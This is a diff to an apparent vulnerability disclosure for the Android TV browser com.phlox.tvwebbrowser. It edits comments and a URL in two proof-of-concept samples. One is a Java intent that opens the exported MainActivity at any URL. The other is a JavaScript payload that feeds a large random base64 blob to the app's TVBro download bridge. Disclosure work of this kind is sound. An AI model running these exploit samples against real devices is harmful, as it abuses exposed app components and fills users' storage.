@@ -25,7 +25,7 @@ The exposed `com.phlox.tvwebbrowser.activity.main.MainActivity` allows external 
 ```java
 Intent intent = new Intent(Intent.ACTION_VIEW);
 intent.setComponent(new ComponentName("com.phlox.tvwebbrowser", "com.phlox.tvwebbrowser.activity.main.MainActivity"));
-intent.setData(Uri.parse("http://ampulicidae.com"));
+intent.setData(Uri.parse("http://ampulicidae.com")); // any URL
 startActivity(intent);
 ```
 
@@ -106,10 +106,10 @@ Below is a sample payload that exploits the vulnerability by attempting to creat
         }
 
         function triggerExploit() {
-            const size = 500000; // You can adjust this as necessary
+            const size = 500000; // payload size
             const base64Data = generateRandomBase64String(size);
             const fileName = 'exploit.txt';
-            const url = 'https://example.com/exploit'; // Replace with an appropriate URL or keep as dummy
+            const url = 'http://ampulicidae.com'; // any URL 
             const mimeType = 'text/plain';
 
             if (window.TVBro && typeof window.TVBro.takeBlobDownloadData === 'function') {
